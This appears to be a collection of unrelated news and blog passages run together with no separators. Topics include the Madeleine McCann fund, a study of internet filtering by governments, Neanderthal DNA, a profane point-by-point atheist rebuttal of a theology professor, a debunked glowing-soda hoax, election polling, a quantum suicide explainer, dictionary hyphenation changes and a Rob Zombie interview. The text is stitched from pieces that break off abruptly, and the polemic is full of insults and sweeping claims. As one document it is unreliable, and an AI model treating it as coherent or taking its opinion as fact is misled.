The parents of Madeleine McCann used a fund that was established to help search for the missing girl to make mortgage payments on their home , a family spokesman said Tuesday .
Madeleine 's parents , Kate and Gerry McCann , have stopped working to run their very public search for their daughter , who disappeared during a vacation in Portugal 's Algarve region on May 3 , a few days before her fourth birthday .
" The fund has always had the ability to assist the family financially if necessary , and they 've only used it to pay for two mortgage payments [ both ] earlier this year , " said the spokesman , Clarence Mitchell .
" When they were made arguido [ suspects ] it stopped , which was a mutual decision on the part of the fund and the McCanns .
" They were happy to accept that their changed status meant they were no longer entitled to that assistance , " he said .
Celebrities , including Harry Potter author J.K. Rowling and soccer star David Beckham , made public appeals that helped raise money for the Find Madeleine fund , which raised at least one million pounds or almost $ 2 million Cdn .
Portuguese police have named a British man , Robert Murat , and Madeleine 's parents as formal suspects , but have not filed any charges .
The McCanns deny involvement in the disappearance of their daughter , who reportedly went missing while the parents dined in a nearby restaurant at the resort .
The girl was alone in the family 's hotel room with her two younger siblings at the time .

China filtered a wide range of topics , said the report
The study of thousands of websites across 120 Internet Service Providers found 25 of 41 countries surveyed showed evidence of content filtering .
Websites and services such as Skype and Google Maps were blocked , it said .
Such " state - mandated net filtering " was only being carried out in " a couple " of states in 2002 , one researcher said .
" In five years we have gone from a couple of states doing state - mandated net filtering to 25 , " said John Palfrey , at Harvard Law School .
What 's regrettable about net filtering is that almost always this is happening in the shadows .
John Palfrey , Harvard Law School
Mr Palfrey , executive director of the Berkman Center for Internet and Society , added : " There has also been an increase in the scale , scope and sophistication of internet filtering . "
ONI is made up of research groups at the universities of Toronto , Harvard Law School , Oxford and Cambridge .
It chose 41 countries for the survey in which testing could be done safely and where there was " the most to learn about government online surveillance " .
A number of states in Europe and the US were not tested because the private sector rather than the government tends to carry out filtering , it said .
Countries which carry out the broadest range of filtering included Burma , Iran , Pakistan , Saudi Arabia , Syria , Tunisia , the United Arab Emirates and Yemen , the study said .
The filtering had three primary rationales , according to the report : politics and power , security concerns and social norms .
The report said : " In a growing number of states around the world , internet filtering has huge implications for how connected citizens will be to the events unfolding around them , to their own cultures , and to other cultures and shared knowledge around the world . "
The report said net censorship was spreading across the globe
Jonathan Zittrain , Professor of Internet Governance and Regulation at Oxford University , said the organisation was also looking at the tools people used to circumvent filtering .
" It 's hard to quantify how many people are doing this .
As we go forward each year we want to see if some of these circumvention technologies become more like appliances and you just plug them in and they work , " he added .
" Few states restrict their activities to one type of content , " said Rafal Rohozinski , Research Fellow of the Cambridge Security Programme .
He added : " Once filtering is begun , it is applied to a broad range of content and can be used for expanding government control of cyberspace .
It has become a strategic forum of competition between states , as well as between citizens and states . "
Mr Palfrey said the report was an attempt to shine a spotlight on filtering to make it more transparent .
" What 's regrettable about net filtering is that almost always this is happening in the shadows .
There 's no place you can get an answer as a citizen from your state about how they are filtering and what is being filtered . "
The survey found evidence of filtering in the following countries :
Azerbaijan , Bahrain , Burma / Myanmar , China , Ethiopia , India , Iran , Jordan , Libya , Morocco , Oman , Pakistan , Saudi Arabia , Singapore , South Korea , Sudan , Syria , Tajikistan , Thailand , Tunisia , Turkmenistan , UAE , Uzbekistan , Vietnam and Yemen .

The first comparison of human and Neanderthal DNA shows that the two lineages diverged about 400,000 years ago and that Neanderthals may have had more DNA in common with chimps than with modern humans .
There is ongoing debate over whether the Neanderthals were a separate species , Homo neanderthalensis , or a subspecies of Homo sapiens .
The first Neanderthals are thought to have emerged about 350,000 years ago , so the new findings from this DNA analysis strongly favour the theory that modern humans and Neanderthals share a common ancestor but are not more closely related than that .
Genetic analysis of Neanderthals is very tricky because mere fragments of nuclear DNA have been recoverable from fossils .
Previous analyses have focused on mitochondrial DNA samples , which survive better .
James Noonan at Lawrence Berkeley National Laboratory in California , US , and colleagues compared human , chimpanzee and Neanderthal nuclear DNA samples .
The newly compiled DNA dataset was derived from the remains of a 45,000 - year - old Neanderthal fossil .

No contribution
From the enriched dataset , the researchers calculated that humans and Neanderthals diverged approximately 400,000 years ago .
And the new data promise to reveal more about the genetic basis of differences between humans and Neanderthals – differences that presumably resulted in the success of modern humans as a species – the researchers say .
“ This is a hint of exciting things to come as more Neanderthal sequence is produced , ” says David Haussler at the University of California , Santa Cruz , US .
The researchers say the findings strengthen the argument that Neanderthals did not contribute substantially to the modern human genome .
“ Were there Neanderthals in our lineage ?
All of the genetics seems to be going in the direction that there weren’t , ” says Richard Potts , head of the Smithsonian Institution ’s Human Origins Program in Washington DC , US .
Noonan will present the findings at the American Society of Human Genetics conference in New Orleans , US , this week .

Many of you may already have seen the recent anti-atheist screed by one Dr. Roger Olson , a professor of theology at Baylor University .
Some of you may even have noticed some of the problems with it .
Well , 1585 noticed all of the problems with it , and will enumerate them in short order .
Excited ?
We thought so .
Here follows our point - by - point response .
( Dr. Olson 's original text is represented in its entirety , in boldface , but interrupted by our responses . )
" I feel sorry for atheists .
They are so much in the minority in American society and they are bound to feel some marginalization if not persecution . "
These first two points are presented as an expression of tolerance , but are no such thing .
They are an attempt to 1 ) place yourself on the moral high ground , and more importantly 2 ) reframe atheists as a minority in the power sense , rather than merely in the numerical sense .
Yes , obviously , atheists are statistically a minority of the population — but this is not all that the word minority is used to mean .
We often describe women as a “ minority , ” despite the fact that there are numerically more women than men — why is this ?
Because , societally speaking , men have more power — so minority has a connotation beyond the numerical .
Conversely , millionaires are a small percentage of the population — but have you ever heard anyone refer to millionaires as a minority ?
No — because millionaires have more power than non-millionaires .
Now , since atheists are , on the whole , more intelligent than theists , and possess the sizable advantage of believing things that can be proven in place of things that are made up out of whole cloth , it would be inaccurate to look upon atheists as a minority in the power sense — yes , theists have more political power , due to the fact that we live in a democracy and you guys comprise a numerical majority — but when there is an argument , we win , period .
But you open by talking about atheists as if we ’re handicapped or something — as if we lack something that you have , rather than the other way around .
" Christians should be the last people to persecute anyone -- including atheists .
But that does n't mean Christians have to accommodate atheism as they tolerate and love atheists . "
First of all , we noticed that you say Christians “ should be the last people to persecute anyone , ” instead of “ are . ”
This is , of course , because if you said “ are ” it would be just about the least true statement of all time — and since the rest of the piece is about how religion allegedly makes people more moral , I guess we ’re done here …
But what the hell , we ’ll keep going .
Your prescription here is basically that religious people should refrain from full - out attacking atheists in the street — and we ’re supposed to be , what , grateful for your magnanimity ?
( Hey , wait a minute …
You do n’t say “ religious people , ” you say “ Christians ” …
We guess that means you ’re also implicitly applying the “ tolerate but do n’t accommodate ” principle to all the people who are religions besides Christianity too , huh ?
But we understand that you could n’t very well open an essay by announcing that you feel sorry for Jewish people .
Yeah , that ’s some nice moral high ground you ’ve got there . )
The “ no accommodation ” clause clearly means that you ’re free to keep voting for lunatics who want to base all the laws on religious bullshit , tying the hands of science teachers , and perpetuating the idea that gay people are mentally ill , so what do you even mean by “ tolerate and love ? ”
If you can fuck with us by voting , you have no need to be openly mean to us in person , so you are conceding nothing .
This is like a Jim Crow supporter thinking he ’s a great guy because he still smiles at Black people on the sidewalk .
" We have to recognize atheists ' full freedom to believe God does not exist , but we do n't have to embrace atheism as a social good .
In fact , I would argue that atheism has no redeeming social value . "
Holy shit , you ’re right !
Atheism has no redeeming social value !
How can we possibly get out of this one ?
Oh , wait , here are three ways we can get out of this one : “ Not believing in Santa Claus has no redeeming social value , ” “ Not believing in Leprechauns has no redeeming social value , ” and “ Not believing in the Loch Ness Monster has no redeeming social value . ”
In fact , we can come up with a lot more than three of those .
The point , of course , is that no shit the absence of a belief in a made - up thing does not inherently have “ redeeming social value . ”
We ’re not arguing that it does .
" Atheism undermines values .
How ?
Let 's look at care for others .
Yes , an individual atheist might care for other people .
But when have you heard of an entire atheist organization serving the poor , the sick or the hungry ?
So far , at least , atheists have n't demonstrated their concern for others in any organized way . "
No , we have n’t heard of an entire atheist organization doing that .
Know why ?
Because why the fuck would there even be an “ entire atheist organization ? ”
The only thing that organizes us is the fact that we do n’t believe what you believe , so this is like saying that there should be conventions for people who do n’t like Star Trek .
What would they do — hang out and talk about things besides Star Trek ?
As for demonstrating our concern for others , we are doing that simply by being atheists , since religion fucks over a lot more people than it helps .
Concern for many types of people — gays and women , for example — is inherent in the fight against organized religion , and for many atheists , the fact that they do n’t like how religion treats those people is a big part of how they got to be atheists in the first place .
But since the only group of people you specifically brought up is the poor , we ’ll bring party politics into it and say that we demonstrate our concern for the poor by fighting against the party that fucks them over the most , which happens also to be the same party that religious people vote for , mainly because it also fucks over the people that you guys explicitly want to fuck over , which brings us back to gays and women .
Oh , and in case you ’re going to bring up helping the poor through “ faith - based initiatives , ” guess what ?
The impetus for those has dick - all to do with religion , and they ’re just a means of abnegating governmental or broader societal responsibility in favor of privatization , the point of which is not to help the poor but to make rich people even richer , but they do it through the “ faith - based ” route so no - one notices and it turns into an argument about religion instead of about privatization , because more people are on their side when it ’s an argument about religion .
If you really care so much about the poor , how about you stop letting these assclowns trick you into fucking them over ?
Oh , right — because your religious faith is blinding you to the fact that this is what ’s happening .
Hey , maybe atheism does have “ redeeming social value ” after all !
" But more importantly , atheism undermines values such as care for others because it cannot explain why anyone should care for others .
If there is no God or anything at all above nature , then nature is all there is .
The law of nature is survival of the fittest .
Why help the less fit survive unless there is a God who loves them because they are created in his image ? "
We ’ll start by pointing out that that last question implies that , although we are good people just because we ’re good people , you are apparently only a good person because you want a reward from God .
That being said , this paragraph rests on a false dilemma— namely , it assumes that caring for others is not itself a part of “ fitness ” as it concerns adaptation via natural selection .
But it is .
Human beings evolved the capacity to care for others because it helped us to work in teams and plan for the future — if it had n’t , then it would n’t be the case that human beings care about others , but since we do , that means it did .
One of the many things human beings did as a result of this , by the way , was invent a made - up thing called God to try and ensure that people behaved themselves .
Now , obviously , not all human beings are nice to all other human beings all the time — if we were , there ’d be no problems , and the bit about inventing God would n’t have been fucked up by assholes .
Of course , this explanation makes no sense if you do n’t believe in evolution — but if you do n’t believe in evolution , then why cite “ survival of the fittest ” as a real principle that humanity must work to counteract ?
In any case , this whole paragraph only makes sense if you have no idea how an atheist thinks — in short , we care about people because caring about people is nice , and we do n’t need to believe that there ’s an invisible man in the sky to know what “ nice ” means .
And , by the way , neither do you .
As many atheists have pointed out , religious people do n’t actually get their morality from their religions — they only think they do .
If they really got their morality from their religions , then they would not have possessed the ability to modify their religions over time to make them less crazy .
Why is it that you do n’t still stone people to death for working on the Sabbath ?
Because you figured out that it was bullshit , even though your holy book says you should do it .
Conclusion : your ideas about what is or is n’t nice originate from something other than your religion ( the accurate ones , at least ) .
" What argument can atheism marshal against ' might makes right ' ? "
This one : no , it does n’t .
We certainly did n’t need religion to figure out that just because someone can beat you up , that does n’t mean he ’s right .
We figured that out on the playground in kindergarten .
The proof that we figured that out , by the way , is the fact that we are currently fighting against you even though you outnumber us numerically and control the government .
Why are we doing this ?
Because you ’re not right , even though you are “ mighty . ”
Oh , and you know who ’s really shitty at marshaling arguments against “ might makes right ? ” Religious people .
If you do n’t believe us , go ask a Spanish Conquistador .
" Many atheists argue that caring for others can be encouraged based on self - interest .
But what answer can an atheist give ( that is consistent with atheism ) to the question , " What if I figure out a way to be personally happy and fulfilled while oppressing other people ? "
There is no answer to that without appeal to someone transcendent to whom we are all accountable . "
No , we do n’t argue that “ caring for others can be encouraged based on self - interest ” — we argue that it evolved based on self - interest , because that ’s how things evolve .
If something did n’t involve self - interest ( or more accurately , the self - interest of your genes — which is why , for example , your body is still trying to get pregnant or impregnate someone even when that ’s the last thing you want to happen ) at some point , it would n’t be a trait now .
Once again , a religious person has confused a scientific descriptive argument with an ethical prescriptive one — e.g. , this is like saying that the Law of Gravity encourages you to push people off of tall buildings , when all it does is inform you that if you do , they will fall .
As for people who figure out a way to be happy while oppressing other people , why do n’t you tell us , since you ’re the ones who are oppressing other people ?
Since you have apparently figured out a way to justify this that is consistent with religion , we should have no trouble figuring out a way to not do this that is consistent with atheism .
We agree , however , with your last sentence above — minus the word “ transcendent . ”
It is indeed the case that there can be no morality “ without appeal to someone to whom we are all responsible , ” and that someone is one another .
Honestly — we are atheists , so if we do n’t care about people , then why are we bothering to write this ?
We ’re not getting paid , and we are clearly smart enough that we could be using our talents to do some stupid shit where we ’d make a lot of money instead of this , if we so chose .
Advertising , maybe ?
You know we could trick people into buying a bunch of useless crap .
But we do n’t .
Or , for that matter , look at religion vs. atheism itself — it is clearly more socially advantageous to be religious , and if we wanted to , we could just pretend to be religious , and become the most eloquent and persuasive religious people around , and we ’d probably be working for the government now and be rich .
But we do n’t .
Why ?
Because from an ethical standpoint , we do n’t like the way you guys fuck with people who do n’t deserve it , and from a conceptual standpoint , even though we might have evolved reason in order to remember which berries were and were n’t poisonous , we ’re stuck with it now , and ca n’t help noticing when something makes no fucking sense at all — at least , some of us can’t .
" And atheism has no answer to social Darwinism -- the idea that society should not help the weak because it 's nature 's way to weed out the less fit .
Helping the weak goes against nature and if nature is all there is , well , why should we fight it ?
A person might choose to , but not because of any transcendent , objective obligation ( such as that all persons are created in God 's image ) . "
Our answer to “ social Darwinism ” is that it actually has nothing whatsoever to do with Darwinian evolution , and is merely a term invented by rich assholes who wanted an excuse to keep being rich assholes ( guess what party they belonged to ? ) .
Poverty is not “ nature ’s way to weed out the less fit , ” because poverty is inherited socially , not passed on genetically .
If someone wins the lottery , does that mean that their genes are the most desirable ?
Helping the weak does not go against nature , and we can prove it , thusly : since nature is all there is , and people do help the weak , that means it does n’t go against nature .
As for who does or does n’t get weeded out , try asking a woman who she ’d rather have kids with — a guy who has compassion for the weak , or a guy who goes around shooting the weak in the face .
Did she pick the first guy ?
Well , we guess that means the guy who goes around shooting the weak wo n’t be having any kids , or at least not any who get cared for enough to grow up to be good people themselves , hence becoming romantically desirable themselves ( we realize women also like rich guys , but all we set out to establish here is that altruism is frequently selected for ) .
Really , this is like junior - high science - class stuff here — or it would be , if you would fucking let us teach it .
The reason we “ fight ” nature is because nature is frequently a pain in the ass — hence , glasses and contact lenses , contraceptives , cures for diseases , and airplanes .
" Not only does atheism undermine values ; it also undermines meaning .
I 'm talking about meaningful reality -- life with meaning and purpose . "
This sounds great , but it barely means anything .
If the “ values ” you ’re talking about include beating the shit out of gay people , burning witches at the stake , robbing people of happiness by teaching them to hate their own bodies for no reason , and imprisoning Galileo , then we ’re very proud indeed to be playing a part in the grand tradition of undermining them .
Our lives have meaning because we ’re alive and we say they do , and our lives have purpose because we have dedicated them to fighting you .
Or , to a somewhat less inspiring extent , because we do fun stuff sometimes , which is totally cool as long as you ’re not hurting anybody .
Plus , even you , and lots of other religious people , figure out in non-religious ways that stuff has meaning and purpose all the time .
For example , do you think that the works of William Shakespeare have meaning and purpose ?
Okay , and does it say that they do in the Bible ?
Well , then apparently you figured this out independently of religion .
" German theologian Hans Küng wrote Does God Exist ?
An Answer for Today .
In it , the maverick Catholic thinker argued that atheism can provide no basis for " basic trust " in the meaningfulness of reality .
The only logical option for the atheist is nihilism -- belief that nothing has any objective meaning or purpose . "
Okay , we ’ve been over this before , but you know what else “ provides no basis for basic trust in the meaningfulness of reality ? ”
The absence of a belief in Santa Claus , Leprechauns , the Loch Ness Monster , etc .
The reason we do n’t believe in those things is n’t because we think a lack of belief in them leads to “ trust in the meaningfulness of reality ” — it ’s because we ’re smart and figured out they do n’t really exist , which we kind of could n't help doing , on account of the whole “ smart ” thing .
Actually , we guess , that does bespeak a certain “ trust in the meaningfulness of reality , ” in the sense that we acknowledge the Law of non-Contradiction , i.e. , that a proposition and its mutually exclusive reverse cannot simultaneously be true , e.g. , either Leprechauns exist or Leprechauns do not exist , but Leprechauns cannot simultaneously exist and not exist .
So maybe you should be pissed at agnostics instead .
As for nihilism , you are making too much and too little out of the word “ objective ” there .
All that a lack of objective meaning means is that human existence is n’t being evaluated by an all - knowing external observer .
Would it matter to the rest of the Universe if we destroyed ourselves in a nuclear war ?
No .
Would it matter to us ?
Yes .
Hence , we really , really do not want this to happen .
Oh , and we also do n’t know where the fuck a religious nut gets off telling us what “ the only logical option ” is .
When we want to know about our logical options , we ’ll ask someone besides a guy who decided to believe that some book about not touching the skin of dead pigs and volunteering your daughters to be gang - raped by an angry mob written by some random guys who were two steps removed from being fucking cavemen is the be-all and end - all of human existence , thanks .
" Küng admitted that atheism is a rational " basic choice " and it cannot be proven wrong in any kind of absolute way .
But most atheists demonstrate their basic trust in the meaningfulness of reality by being outraged at evil and injustice , thereby demonstrating that atheism cannot be lived out consistently . "
Really ?
Atheism ca n’t be proven wrong ?
Well , no shit , because proving atheism wrong would necessitate proving the existence of God .
You needed an obscure German philosopher to tell you that there ’s no proof of the existence of God ?
Probably not , so we ’re guessing this is only here so you can work in the word “ choice , ” to try and characterize atheists as people who chose to stop believing in God because we ’re pissed - off malcontents or something , instead of people who figured out that there ’s no God because we ’re smart .
Did Küng “ admit ” that disbelief in vampires is a “ rational choice ” too ?
Because if he did , we ’d like to send him a thank - you note , seeing as how we happen not to believe in vampires , and are so relieved to finally have this “ choice ” validated .
And we think we ’re safely ahead on points by now , so our response to your assertion that being outraged at evil is inconsistent with atheism is simply “ Go fuck yourself . ”
" What makes something evil or unjust if nothing like God exists -- if nature is all there is ?
Only subjective choice either by an individual or a society .
But that can change and it often does .
Without God , the social prophet has no way out of relativism .
Baylor and universities like it exist to promote objective values and meaningful existence .
For them atheism is not benign , but the enemy -- even if atheists themselves are not .
Finally , let me repeat that I have nothing against atheists as persons and neither does Baylor University .
But in my opinion , they are people of character and virtue in spite of their philosophy of life -- not because of it . "
We have already been over the fact that you are making too much of the “ objective / subjective ” distinction .
Subjectivity is not scary to us , because we realize that things have actually been subjective all along , whereas you are only just now beginning to suspect that they might be .
There are of course situations where objectivity exists , and we acknowledge a lot more of them than you guys do — e.g. , it is objectively true that man evolved from apes , it is objectively true that the planet is more than 6,000 years old , it is objectively true that Noah ’s Ark did n’t really happen , etc .
Your “ if ” up there is simply a fact to us , and we can see evidence of this just as clearly in your ways as we can in ours .
Yes , absolutely , the choices of individuals and societies do change — which is how you guys decided to stop stoning adulterers , burning sacrifices , and keeping slaves , even though your magic book says the same exact stuff about those things as it did back in the day .
This is also , by the way , presumably why you directed this screed only at atheists , rather than indiscriminately at atheists and all the religious people who are different religions from yours .
Once upon a time , as you well know , there would have been no difference to you — a heathen was a heathen .
Despite our crack about it earlier , we do n’t think you really “ feel sorry for ” Jewish people — or even for , say , Buddhists , despite the fact that Buddhism has no “ objective ” creator God in the way that your religion does .
As long as somebody has some kind of unsupportable belief and calls it a religion , apparently , you ’re cool with that — and guess what ?
That means you ’re admitting that your objective beliefs are really subjective .
We do n’t know what you mean by “ social prophet , ” but if it means philosopher , then sure , he has “ no way out of relativism . ”
And , as we ’ve shown a few times here , neither does the regular “ prophet , ” since he ’s just a philosopher who ’s fooling himself into thinking he ’s something else .
We mean , even if there were a God , it would still be the case that all the stuff religious people believe he wants them to do was made up by humans , right ?
And even if you believe that this part or that part of the Bible was dictated by God , those are a lot of the parts you guys have since softened up on , of your own accord — but are still just as convinced that you ’re doing the “ right ” thing .
But of course , this is only a problem for ethics .
Science , as we ’ve explained , is a different matter altogether .
If you like objectivity so much , you should try letting us teach it — maybe even in one of those universities you think we ’re the “ enemy ” of , when we ’re actually the only thing keeping them from being burnt to the ground by religious people .
Anyway , Dr. Olson , by way of closing , we ’re happy to tell you that we partly agree with your last point .
You are indeed correct that we are not people of character and virtue because of our atheism — we were people of character and virtue first , and this is what has enabled us to become atheists .
Sexo Grammaticus is Lord High Editor of The 1585 .
The notion that mixing small amounts of baking soda and hydrogen peroxide into some Mountain Dew soda will produce a brilliantly glowing solution is a Fool ’s Errand , a bit of flimflammery intended to send the gullible out to fulfill an absurd and impossible task .
The glowing Mountain Dew jape first hit the Internet in 2007 in the form of a video clip and has been making the rounds on Facebook since 2012 :
[ Collected via e-mail , July 2012 ]
For camping or late nights at the beach ?
Leave 1/4 of Mountain
Dew in bottle ( just do n’t drink it all ) , add a tiny bit of baking soda and 3 caps of peroxide .
Put the lid on and shake – walla !
Homemade glow stick ( bottle ) solution .
[ Collected via e-mail , October 2007 ]
My son told me about this video clip that claims that you can make Mountain Dew Glow with just a little bit of baking soda and hydrogen peroxide .
The clip is fairly convincing , but the chemistry does n’t make sense to me .
Is this a hoax ?
There is nothing in Mountain Dew or any other ordinary carbonated soda that would cause it to fluoresce as shown in the above video simply through the introduction of a little baking soda and hydrogen peroxide .
The familiar chemiluminescenct effect produced by common glow sticks comes mixing hydrogen peroxide and diphenyl oxalate with a fluorophore dye ; the chemical reaction between the hydrogen peroxide and diphenyl oxalate releases energy that excites the dye , and the dye subsequently relaxes by releasing a photon , producing a glow effect .
But Mountain
Dew contains no diphenyl oxalate , and the addition of baking soda ( i.e. , sodium bicarbonate ) to Mountain Dew will neither produce nor substitute for the needed diphenyl oxalate .
As well , the food colorings used in Mountain Dew are n’t the type of dye that can be “ turned on ” through this form of chemical reaction .
The results claimed in the original video were likely created by the surreptitious introduction of a glow solution into the Mountain Dew bottle , either through off - screen manipulation or via a substitution covered by editing .
In August 2013 , a video circulated on social media sites asserted it took two Starbust candies to make glowing Mountain Dew .
That too was false .

The issue of Hillary ’s “ electability ” comes up pretty often .
Interestingly , she beats the other GOP candidates in national polls .
But , as Joe always says , you have to look at the state polls to truly get a sense of what ’s happening ( you can win the national vote but still lose the electoral vote , as we all know ) .
Still , this is good news for the Clinton camp , and for all of us should Hillary be the nominee .
And actually , perhaps even more interesting , are the margins of Hillary ’s victory .
Thompson and Romney are GOP favorites , but in the national poll , Hillary trounces them the most .
That suggests that the stranglehold that “ conservatives ” have over the GOP will be a detriment in national elections .
The quantum suicide thought experiment is based on and seeks to prove what has bec­ome an increasingly accepted interpretation of quantum physics , the Many - Worlds theory .
This theory was first proposed in 1957 by a doctoral student at Princeton University named Hugh Everett III .
The theory was scorned for decades until fellow Princetonian Max Tegmark created the quantum suicide experiment , which lends support to the interpretation [ source : The Guardian ] .
According to the Many - Worlds theory , for each possible outcome to an action , the world splits into a copy of itself .
This is an instantaneous process Everett called decohesion .
It 's kind of like a choose - your - own - adventure book , but rather than choosing between either exploring the cave or making off with the treasure , the universe splits in two so that each action is taken .

One vital aspect of the Many - Worlds theory is that when the universe splits , the person is unaware of himself in the other version of the universe .
This means that the boy who made off with the treasure and ends up living happily ever after is completely unaware of the version of himself who entered the cave and now faces great peril , and vice versa .
This is the same case with quantum suicide .
When the man pulls the trigger , there are two possible outcomes : the gun either fires or it does n't .
In this case , the man either lives or he dies .
Each time the trigger is pulled , the universe splits to accommodate each possible outcome .
When the man dies , the universe is no longer able to split based on the pulling of the trigger .
The possible outcome for death is reduced to one : continued death .
But with life there are still two chances that remain :
The man continues living or the man dies .
" " A guidebook to the quantum world ?

­ When the man pulls the trigger and the universe is split in two , however , the version of the man who lived will be unaware that in the other version of the split universe , he has died .
Instead he will continue to live and will again have the chance to pull the trigger .
And each time he does pull the trigger , the universe will again split , with the version of the man who lives continuing on , and being unaware of all of his deaths in parallel universes .
In this sense , he will be able to exist indefinitely .
This is called quantum immortality .
So why are n't all of the people who have ever attempted to kill themselves immortal ?
What 's interesting about the Many - Worlds interpretation is that according to the theory , in some parallel universe , they are .
This does n't appear to be the case to us , because the splitting of the universe is n't dependent on our own life or death .
We are bystanders or observers in the case of another person 's suicide , and as observers we 're subject to probability .
When the gun finally went off in the universe -- or version -- we inhabit , we were stuck with that result .
Even if we pick up the gun and continue shooting the man , the universe will remain in a single state .
After all , once a person is dead , the number of possible outcomes for shooting a dead person is reduced to one .
But the Many - Worlds theory stands in contradiction to another quantum theory , the Copenhagen interpretation .
In the next section , we 'll look at this theory and see why it changes the rules of quantum suicide .
LONDON ( Reuters ) - About 16,000 words have succumbed to pressures of the Internet age and lost their hyphens in a new edition of the Shorter Oxford English Dictionary .

Bumble - bee is now bumblebee , ice - cream is ice cream and pot -belly is pot belly .
And if you ’ve got a problem , do n’t be such a crybaby ( formerly cry - baby ) .
The hyphen has been squeezed as informal ways of communicating , honed in text messages and emails , spread on Web sites and seep into newspapers and books .
“ People are not confident about using hyphens anymore , they ’re not really sure what they are for , ” said Angus Stevenson , editor of the Shorter OED , the sixth edition of which was published this week .
Another factor in the hyphen ’s demise is designers ’ distaste for its ungainly horizontal bulk between words .
“ Printed writing is very much design - led these days in adverts and Web sites , and people feel that hyphens mess up the look of a nice bit of typography , ” he said .
“ The hyphen is seen as messy looking and old - fashioned . ”
The team that compiled the Shorter OED , a two - volume tome despite its name , only committed the grammatical amputations after exhaustive research .
“ The whole process of changing the spelling of words in the dictionary is all based on our analysis of evidence of language , it ’s not just what we think looks better , ” Stevenson said .
Researchers examined a corpus of more than 2 billion words , consisting of full sentences that appeared in newspapers , books , Web sites and blogs from 2000 onwards .
For the most part , the dictionary dropped hyphens from compound nouns , which were unified in a single word ( e.g. pigeonhole ) or split into two ( e.g. test tube ) .
But hyphens have not lost their place altogether .
The Shorter OED editor commended their first - rate service rendered to English in the form of compound adjectives , much like the one in the middle of this sentence .
“ There are places where a hyphen is necessary , ” Stevenson said .
“ Because you can certainly start to get real ambiguity . ”
Twenty - odd people came to the party , he said .
Or was it twenty odd people ?
Some of the 16,000 hyphenation changes in the Shorter Oxford English Dictionary , sixth edition :
Formerly hyphenated words split in two :
fig leaf
hobby horse
ice cream
pin money
pot belly
test tube
water bed
Formerly hyphenated words unified in one :
bumblebee
chickpea
crybaby
leapfrog
logjam

If you 're Rob Zombie you take the challenge , and you go for it .
Intimidating as it might have seemed , and certainly not without a little hesitation Rob Zombie has taken on the seemingly impossible task of reinventing " HALLOWEEN " .
Here he talks candidly with Icons of Fright about what it takes to bring new life , and a new sense of sheer terror to an aging horror series .
- by Mike C. ( with Mike Bacon from Friday Morning Quarterback ) - 8/07
How did the opportunity to direct " HALLOWEEN " present itself for you ?
You know , it came up in a weird way .
After I finished “ THE DEVIL’S REJECTS ” I met with a lot of different people .
Other remakes came my way that I did n’t have any interest in , other original stuff too , different things .
Took a million meetings , kinda worked on some projects a little bit .
Then they started turning into things I did n’t want to be associated with .
One day I got a call asking if I wanted to meet with Bob Weinstein because he was in town , I think for the Golden Globes .
Ok , I ’ll have a meeting , but this is the last fucking meeting I ’m doing .
I ’m sick of having meetings because they never amount to anything .
It ’s just a lot of chit - chat .
So I went and met him at his hotel and we started talking and he just threw out “ " HALLOWEEN " ” .
Dimension owns the rights to " HALLOWEEN " and he wanted to know my take on " HALLOWEEN " .
Not as a remake , just in any sense .
They had " HALLOWEEN " and they did n’t know what to do with it essentially .
I know they had tried several times to make a " HALLOWEEN " movie and it failed , so that ’s basically how it came to me .
Just out of the blue .
So you get " HALLOWEEN " as your project , and it must be great considering you 're a huge genre fan , but also consequently you have to reinvent " HALLOWEEN " .
Did you have a moment where you thought “ What have I gotten myself into ? ”
Well , at first I did n’t know if I really wanted to do it because I was not really keen on the idea of making a remake .
I just said “ I do n’t know , I ’ll think about it ” , sort of thinking that I was going to call them back later and say no .
But I left there and I thought about it for a couple of weeks .
And then I kind of starting feeling like , “ Wait a minute .
Why am I assuming that this is a bad idea ?
This could be an incredible idea .
I ’m taking the completely wrong attitude . ”
And I started working on it thinking , Yeah I ’m totally going to do this .
I started envisioning how you could do this .
I looked at it and thought Michael Myers is a great character .
He ’s one of the few modern day iconic monsters .
There ’s only about 4 or 5 modern day monsters .
They very rarely pop up and present themselves in a classic way .
So , I thought , “ Shit I have to do this movie .
This is a great thing .
This could be so great . ”
How much free reign was given to you to make it yours ?
100 % .
I would n’t have done it any other way .
That ’s what they wanted .
Bob Weinstein said , “ We want you to take it and run with it ! ”
If there was only one thing he kept stressing to me more and more , which became his catch phrase was , “ Make it more Rob Zombie ! ” ( Laughs )
He was n’t worried about protecting the franchise … he was n’t worried about anything .
He just wanted me to take it and run with it .
Once again , it was a very rare situation so it was very difficult to say no .
Was it difficult to make it ?
You had a lot of time between HOUSE OF 1000 CORPSES and THE DEVIL’S REJECTS .
" HALLOWEEN " was announced last June ( 2006 ) and it ’s now coming out August ( 2007 )
The biggest hindrance to me was I made the mistake …
Well , I had seen " HALLOWEEN " a million times , but I had never seen it with the thought that I was going to remake it .
So then I watched it again and again and again , and it actually started doing more harm then it did good , it started fucking with my head because I had the same thought that fans have .
How can you possibly do this ?
How can you change this ?
So , I had to stop watching it and stop thinking about it and just start spinning it off in my own direction .
It was n’t that difficult .
It was harder towards the end , because the beginning of the movie , doing young Michael Myers life was easy because it had n’t existed before .
People look at the first movie and go “ Oh he was a normal kid ! ”
We do n’t really know any of that .
He does n’t say anything and we do n’t really get any insight into him .
That ’s just people projecting that onto what they see .
So , I thought , ok , that ’s good , I can run with that because that ’s pretty much a clean slate .
And then everything with Doctor Loomis in the early days of Smiths Grove Sanitarium was also a clean slate .
I could pretty much do whatever I wanted there .
It was really when I got to the third act of the movie where we got to Haddonfield that I wanted to retain some classic elements .
Make it different but retain classic elements .
The best way I can describe it for people is that it ’s like Batman Begins .
You ’re keeping Wayne Manor .
You ’re keeping Batman .
You want the Batsuit .
You ’re probably going to have Alfred as the butler .
You ’re going to keep some of the classic things , but the way you want to represent it is completely different .
What did you want from your cast ?
What did you want for your Loomis , and for your Jaime and for your Michael Myers ?
The main thing I wanted from everyone at all times was to be real and to take it seriously .
Because one of the problems you have sometimes …
You know …
Horror fans love horror .
But there ’s a whole section of the population that not only do n’t love horror , they do n’t even care about it at all .
Sometimes that ’s an actor you have , so they come into it thinking “ Oh I know what these movies are like .
You know , it ’s going to be kind of campy . ”
You know , they have a preconceived idea of what kind of acting you want for a horror movie .
But no , I do n’t want that .
I want you guys to play this as if it ’s a true story .
Dead serious .
A real thing .
This whole movie ’s going to live and die on the acting .
It ’s not about bad acting and the special FX .
I want this whole movie to be compelling because you guys are giving amazing performances .
Not because there ’s a guy in a big mask walking around .
How beneficial was it for you that some of the main cast members had never seen " HALLOWEEN " ?
I know Malcolm McDowell had never seen the original .
